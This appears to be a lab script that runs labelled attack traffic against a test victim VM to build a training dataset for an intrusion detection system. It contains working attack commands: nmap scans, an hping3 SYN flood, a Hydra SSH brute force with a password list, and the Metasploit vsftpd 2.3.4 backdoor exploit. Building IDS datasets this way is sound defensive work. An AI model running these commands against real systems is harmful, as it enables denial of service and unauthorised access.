#!/bin/bash

set -euo pipefail

# ── settings ────────────────────────────────────────────────
VICTIM="192.168.100.30"
IDS_IP="192.168.100.20"
IDS_USER="idsuser"
LABEL_FILE="/home/idsuser/ids_project/data/current_label.txt"
LOG="$HOME/attack_session.log"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# durations in seconds
DUR_NORMAL=120
DUR_PROBE=60
DUR_DOS=60
DUR_R2L=90
DUR_U2R=60

# ── colours ─────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
B='\033[0;34m'; C='\033[0;36m'; N='\033[0m'

# ── helpers ──────────────────────────────────────────────────

ts()    { date -Iseconds; }
log()   { echo "$(ts) $*" | tee -a "$LOG"; }
banner(){ echo -e "\n${Y}══════════════════════════════════════${N}";
          echo -e "${Y}  $1${N}";
          echo -e "${Y}══════════════════════════════════════${N}\n"; }

# Write the label to IDS VM via SSH
# The sniffer reads this file for every packet automatically
set_label(){
    local label="$1"
    # Write to IDS VM label file over SSH
    ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 \
        "${IDS_USER}@${IDS_IP}" \
        "echo '${label}' | sudo tee ${LABEL_FILE} > /dev/null"
    echo -e "${C}[LABEL] → ${label}${N}"
    log "START ${label}"
}

end_label(){
    local label="$1"
    log "STOP ${label}"
    set_label "normal"
    log "START normal"
}

# ── pre-flight ───────────────────────────────────────────────
preflight(){
    banner "Pre-flight checks"

    echo -e "${B}[*] Checking victim $VICTIM ...${N}"
    if ! ping -c 2 -W 2 "$VICTIM" &>/dev/null; then
        echo -e "${R}[FAIL] Cannot reach victim $VICTIM${N}"; exit 1
    fi
    echo -e "${G}[OK]  Victim reachable${N}"

    echo -e "${B}[*] Checking IDS SSH $IDS_IP ...${N}"
    if ! ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
             "${IDS_USER}@${IDS_IP}" "echo ok" &>/dev/null; then
        echo -e "${R}[FAIL] Cannot SSH to IDS VM${N}"
        echo -e "${R}       Run: ssh-copy-id ${IDS_USER}@${IDS_IP}${N}"
        exit 1
    fi
    echo -e "${G}[OK]  IDS VM SSH works${N}"

    echo -e "${B}[*] Checking sniffer running on IDS VM ...${N}"
    if ! ssh -o StrictHostKeyChecking=no "${IDS_USER}@${IDS_IP}" \
             "pgrep -f sniffer.py" &>/dev/null; then
        echo -e "${R}[FAIL] Sniffer not running on IDS VM${N}"
        echo -e "${R}       On IDS VM run:${N}"
        echo -e "${R}       sudo python3 ~/ids_project/capture/sniffer.py --iface ens36 --daemon${N}"
        exit 1
    fi
    echo -e "${G}[OK]  Sniffer is running${N}"

    if [[ ! -f "$WORDLIST" ]]; then
        echo -e "${Y}[WARN] rockyou.txt not found — trying to extract ...${N}"
        [[ -f "${WORDLIST}.gz" ]] && sudo gzip -dk "${WORDLIST}.gz" || true
    fi

    echo -e "\n${G}All checks passed${N}"
    echo -e "Victim   : $VICTIM"
    echo -e "IDS VM   : $IDS_IP"
    echo -e "Log file : $LOG"
    echo -e "\nStarting in 5 seconds — Ctrl+C to abort"
    sleep 5
}

# ═══════════════════════════════════════════════════════════════
# MAIN ATTACK SEQUENCE
# ═══════════════════════════════════════════════════════════════

preflight

# ── 1. Normal traffic ────────────────────────────────────────
banner "1/5 — Normal traffic baseline (${DUR_NORMAL}s)"
set_label "normal"

echo -e "${B}Generating HTTP, ping, FTP traffic ...${N}"
END=$((SECONDS + DUR_NORMAL))
while [[ $SECONDS -lt $END ]]; do
    curl -s --max-time 3 "http://$VICTIM/"      > /dev/null 2>&1 || true
    curl -s --max-time 3 "http://$VICTIM/dvwa/" > /dev/null 2>&1 || true
    ping  -c 3 -W 1 "$VICTIM"                  > /dev/null 2>&1 || true
    sleep 3
done
log "STOP normal"
echo -e "${G}[DONE] Normal baseline${N}"
sleep 5

# ── 2. Probe — port scan ─────────────────────────────────────
banner "2/5 — Probe attack — port scan (${DUR_PROBE}s)"
set_label "probe"

echo -e "${B}TCP SYN scan ports 1-1024 ...${N}"
nmap -sS -T4 -p 1-1024 "$VICTIM" 2>&1 | \
    grep -E "^[0-9]+/tcp" | head -20 || true

echo -e "${B}Service version detection ...${N}"
nmap -sV -T3 -p 21,22,23,80,3306 "$VICTIM" 2>&1 | \
    grep -E "open|PORT" | head -10 || true

echo -e "${B}OS detection ...${N}"
sudo nmap -O --osscan-guess "$VICTIM" 2>&1 | \
    grep -E "OS|Running" | head -5 || true

echo -e "${B}UDP scan ...${N}"
sudo nmap -sU -T3 -p 53,67,111,161 "$VICTIM" 2>&1 | \
    grep -E "open|PORT" | head -10 || true

end_label "probe"
echo -e "${G}[DONE] Probe${N}"
sleep 5

# ── 3. DoS — SYN flood ───────────────────────────────────────
banner "3/5 — DoS attack — SYN flood (${DUR_DOS}s)"
set_label "dos"

echo -e "${B}SYN flood on port 80 for ${DUR_DOS}s ...${N}"
sudo hping3 -S --flood -V -p 80 "$VICTIM" &
HPID=$!
sleep "$DUR_DOS"
kill "$HPID" 2>/dev/null || true
wait "$HPID" 2>/dev/null || true

end_label "dos"
echo -e "${G}[DONE] DoS${N}"
sleep 5

# ── 4. R2L — SSH brute force ─────────────────────────────────
banner "4/5 — R2L attack — SSH brute force (${DUR_R2L}s)"
set_label "r2l"

if [[ -f "$WORDLIST" ]]; then
    echo -e "${B}Hydra SSH brute force ...${N}"
    timeout "$DUR_R2L" hydra \
        -l msfadmin \
        -P "$WORDLIST" \
        -t 4 -f -V \
        "ssh://$VICTIM" 2>&1 | \
        grep -E "login:|attempt" | head -20 || true
else
    echo -e "${Y}[SKIP] No wordlist — manual attempts ...${N}"
    for pw in msfadmin admin root 123456 password toor; do
        sshpass -p "$pw" ssh \
            -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 \
            "msfadmin@$VICTIM" "whoami" 2>/dev/null && \
            echo "Found: $pw" || true
    done
fi

end_label "r2l"
echo -e "${G}[DONE] R2L${N}"
sleep 5

# ── 5. U2R — vsftpd backdoor ─────────────────────────────────
banner "5/5 — U2R attack — vsftpd backdoor (${DUR_U2R}s)"
set_label "u2r"

echo -e "${B}vsftpd 2.3.4 backdoor via Metasploit ...${N}"
timeout "$DUR_U2R" msfconsole -q -x "
  use exploit/unix/ftp/vsftpd_234_backdoor;
  set RHOSTS $VICTIM;
  set RPORT 21;
  run;
  exit
" 2>&1 | grep -E "session|Exploit|root|FAILED|Started" | head -10 || true

end_label "u2r"
echo -e "${G}[DONE] U2R${N}"

# ── session summary ──────────────────────────────────────────
banner "Attack session complete"

echo -e "${G}attack_session.log:${N}"
cat "$LOG"

echo -e "\n${G}CSV rows by label on IDS VM:${N}"
ssh -o StrictHostKeyChecking=no "${IDS_USER}@${IDS_IP}" \
    "cat ~/ids_project/data/features/capture_*.csv 2>/dev/null | \
     awk -F',' 'NR>1{print \$6}' | sort | uniq -c | sort -rn" || \
    echo "(SSH stats failed — check CSV manually)"

echo -e "\n${G}Phase 1 complete. Next step:${N}"
echo "On IDS VM: python3 ~/ids_project/capture/label_csv.py"

